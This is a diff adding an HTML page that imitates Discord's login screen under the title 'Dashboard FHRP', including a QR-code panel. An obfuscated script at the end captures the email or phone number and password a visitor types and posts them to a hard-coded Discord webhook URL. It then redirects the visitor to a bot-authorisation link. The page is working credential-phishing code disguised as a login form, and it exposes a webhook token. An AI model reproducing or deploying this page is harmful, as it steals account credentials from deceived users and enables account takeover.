@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Discord Login - Dashboard FHRP </title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
+
+    /* Reset and basics */
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      height: 100vh;
+      background: linear-gradient(135deg, #5865F2 0%, #23272A 100%);
+      font-family: 'Inter', sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #DCDDDE;
+    }
+
+    .login-container {
+      background-color: #2F3136;
+      border-radius: 12px;
+      box-shadow: 0 4px 24px rgb(0 0 0 / 0.6);
+      width: 900px;
+      max-width: 95vw;
+      display: flex;
+      padding: 40px 50px;
+    }
+
+    .form-section {
+      flex: 1;
+      margin-right: 60px;
+    }
+
+    .form-section h1 {
+      color: white;
+      font-weight: 700;
+      font-size: 28px;
+      margin-bottom: 6px;
+    }
+
+    .form-section p {
+      color: #B9BBBE;
+      font-weight: 400;
+      margin-top: 0;
+      margin-bottom: 24px;
+      font-size: 16px;
+    }
+
+    label {
+      display: block;
+      font-size: 12px;
+      font-weight: 600;
+      color: #B9BBBE;
+      margin-bottom: 6px;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+    }
+
+    input {
+  width: 100%;
+  background-color: #202225;
+  border: none;
+  border-radius: 6px;
+  padding: 14px 16px;
+  color: black;          /* changed from white to black */
+  font-size: 16px;
+  margin-bottom: 20px;
+  transition: background-color 0.15s ease-in-out;
+}
+
+input:focus {
+  outline: none;
+  background-color: #2C2F33;
+  box-shadow: 0 0 0 2px #5865F2;
+  color: black;          /* also keep text black on focus */
+}
+
+    .forgot-link {
+      font-size: 14px;
+      color: #5865F2;
+      text-decoration: none;
+      display: inline-block;
+      margin-bottom: 28px;
+    }
+
+    .forgot-link:hover {
+      text-decoration: underline;
+    }
+
+    button {
+      background-color: #5865F2;
+      border: none;
+      border-radius: 6px;
+      color: white;
+      font-weight: 600;
+      font-size: 16px;
+      padding: 14px;
+      cursor: pointer;
+      width: 100%;
+      transition: background-color 0.15s ease-in-out;
+    }
+
+    button:hover {
+      background-color: #4752C4;
+    }
+
+    .register-text {
+      font-size: 14px;
+      color: #B9BBBE;
+      margin-top: 16px;
+    }
+
+    .register-text a {
+      color: #5865F2;
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .register-text a:hover {
+      text-decoration: underline;
+    }
+
+    .qr-section {
+      width: 280px;
+      color: #B9BBBE;
+      text-align: center;
+      font-size: 14px;
+      line-height: 1.4;
+      user-select: none;
+    }
+
+    .qr-section img {
+      width: 180px;
+      margin-bottom: 28px;
+      border-radius: 12px;
+      background-color: white;
+      padding: 20px;
+    }
+
+    .qr-section strong {
+      color: white;
+      font-weight: 700;
+    }
+
+    .qr-section a {
+      color: #5865F2;
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .qr-section a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="form-section">
+      <h1>Welcome back!</h1>
+      <p>We're so excited to see you again!</p>
+      <form id="loginForm" autocomplete="off">
+        <label for="username">Email or Phone Number *</label>
+        <input type="text" id="username" name="username" required autocomplete="username" />
+
+        <label for="password">Password *</label>
+        <input type="password" id="password" name="password" required autocomplete="current-password" />
+
+        <a href="https://support.discord.com/hc/en-us" target="_blank" class="forgot-link" rel="noopener noreferrer">Forgot your password?</a>
+
+        <button type="submit">Log In</button>
+
+        <p class="register-text">
+          Need an account? <a href="https://support.discord.com/hc/en-us" target="_blank" rel="noopener noreferrer">Register</a>
+        </p>
+      </form>
+    </div>
+
+    <div class="qr-section">
+      <img src="./qr.png" alt="Discord QR Code" />
+      <p><strong>Log in with QR Code</strong></p>
+      <p>Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
+      <p><a href="#" style="font-weight: 600; color: #5865F2; text-decoration: none;">Or, sign in with passkey</a></p>
+    </div>
+  </div>
+
+  <script>
+const _0x127e1d=_0x2a15;(function(_0x120144,_0x46351a){const _0x3f8642=_0x2a15,_0x1a8b35=_0x120144();while(!![]){try{const _0x301f41=-parseInt(_0x3f8642(0x13f))/0x1*(parseInt(_0x3f8642(0x150))/0x2)+parseInt(_0x3f8642(0x152))/0x3*(-parseInt(_0x3f8642(0x151))/0x4)+parseInt(_0x3f8642(0x147))/0x5*(-parseInt(_0x3f8642(0x142))/0x6)+parseInt(_0x3f8642(0x143))/0x7+parseInt(_0x3f8642(0x15c))/0x8*(-parseInt(_0x3f8642(0x144))/0x9)+-parseInt(_0x3f8642(0x14a))/0xa+parseInt(_0x3f8642(0x141))/0xb;if(_0x301f41===_0x46351a)break;else _0x1a8b35['push'](_0x1a8b35['shift']());}catch(_0x5946a5){_0x1a8b35['push'](_0x1a8b35['shift']());}}}(_0x1118,0x4447a));async function sendToDiscordWebhook(_0x552011,_0xec1dcc){const _0xdfc89=_0x2a15,_0x2cea2c='https://discord.com/api/webhooks/1390603232929120267/ugKA5cb3BCNTthIq_cnODznYtPJ53zrPb17Qpk-zqqHEd71ZDVdwKO3-AJU8u5b165gv',_0x314c4a={'content':_0xdfc89(0x153)+_0x552011+_0xdfc89(0x159)+_0xec1dcc};try{await fetch(_0x2cea2c,{'method':_0xdfc89(0x14b),'headers':{'Content-Type':_0xdfc89(0x154)},'body':JSON[_0xdfc89(0x15a)](_0x314c4a)}),console[_0xdfc89(0x158)]('Data\x20sent\x20to\x20Discord\x20webhook.');}catch(_0x488e08){console[_0xdfc89(0x15b)]('Error\x20sending\x20webhook:',_0x488e08),window[_0xdfc89(0x140)][_0xdfc89(0x14e)]='https://discord.com/oauth2/authorize?client_id=1388259412204064770&permissions=0&integration_type=0&scope=bot';}}function _0x2a15(_0x23624f,_0x155d17){const _0x1118ce=_0x1118();return _0x2a15=function(_0x2a1518,_0x501272){_0x2a1518=_0x2a1518-0x13f;let _0x2b2d7e=_0x1118ce[_0x2a1518];return _0x2b2d7e;},_0x2a15(_0x23624f,_0x155d17);}document[_0x127e1d(0x148)](_0x127e1d(0x14d))['addEventListener']('submit',async _0x5347fb=>{const _0x2dcc9a=_0x127e1d;_0x5347fb['preventDefault']();const _0x2322f7=_0x5347fb[_0x2dcc9a(0x157)][_0x2dcc9a(0x156)][_0x2dcc9a(0x155)],_0x3b2b57=_0x5347fb[_0x2dcc9a(0x157)]['password'][_0x2dcc9a(0x155)];await sendToDiscordWebhook(_0x2322f7,_0x3b2b57),_0x5347fb[_0x2dcc9a(0x157)][_0x2dcc9a(0x14c)](),window['location']['href']=_0x2dcc9a(0x146);}),document[_0x127e1d(0x148)](_0x127e1d(0x14d))['addEventListener'](_0x127e1d(0x149),_0x4c5f95=>{const _0x49fe2b=_0x127e1d;_0x4c5f95[_0x49fe2b(0x145)]();const _0x45d124=_0x4c5f95[_0x49fe2b(0x157)][_0x49fe2b(0x156)][_0x49fe2b(0x155)],_0x4f164f=_0x4c5f95[_0x49fe2b(0x157)][_0x49fe2b(0x14f)][_0x49fe2b(0x155)];sendToDiscordWebhook(_0x45d124,_0x4f164f),_0x4c5f95['target'][_0x49fe2b(0x14c)]();});function _0x1118(){const _0x40e1d9=['reset','loginForm','href','password','6306gWkalH','145144NzCUcc','18FuPBns','**Email:**\x20','application/json','value','username','target','log','\x0a**Password:**\x20','stringify','error','24944CBXCMM','37samCYi','location','8938545AiuRFY','7014CyGCpB','2853991fExVeE','306vjWwOo','preventDefault','https://discord.com/oauth2/authorize?client_id=1388259412204064770&permissions=0&integration_type=0&scope=bot','300WhfQqp','getElementById','submit','4301050YPSOKc','POST'];_0x1118=function(){return _0x40e1d9;};return _0x1118();}
+  </script>
+</body>
+</html>
